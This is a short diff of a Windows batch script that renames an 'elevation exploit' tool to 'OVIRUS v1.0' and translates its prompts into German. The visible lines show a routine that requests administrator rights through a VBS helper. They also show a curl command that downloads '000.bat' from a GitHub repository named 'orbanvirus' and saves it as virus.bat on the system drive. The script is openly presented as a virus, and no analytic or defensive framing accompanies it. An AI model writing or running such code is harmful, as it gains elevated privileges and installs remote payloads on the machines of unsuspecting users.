@@ -1,8 +1,8 @@
 @echo off
-echo MS-DOS Mode Implementation for Windows 10 by Endermanch (Elevation exploit by Matt)
+echo OVIRUS v1.0
 echo.
 echo =-=-=-=-=-=-=-=-=-=-=-=-=
-echo Waiting for elevation...
+echo Warten auf Admin-Rechte...
 echo =-=-=-=-=-=-=-=-=-=-=-=-=
 
 :init
@@ -32,7 +32,7 @@ setlocal & pushd .
 cd /d %~dp0
 if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)
 
-REM ~-~-~-~-~-~-~-~ Batch file starts here
+REM ~-~-~-~-~-~-~-~ Batchdatei startet hier
 echo.
 echo Dateien werden heruntergeladen...
 curl https://raw.githubusercontent.com/martinpornecz/orbanvirus/main/000.bat > %systemdrive%\virus.bat
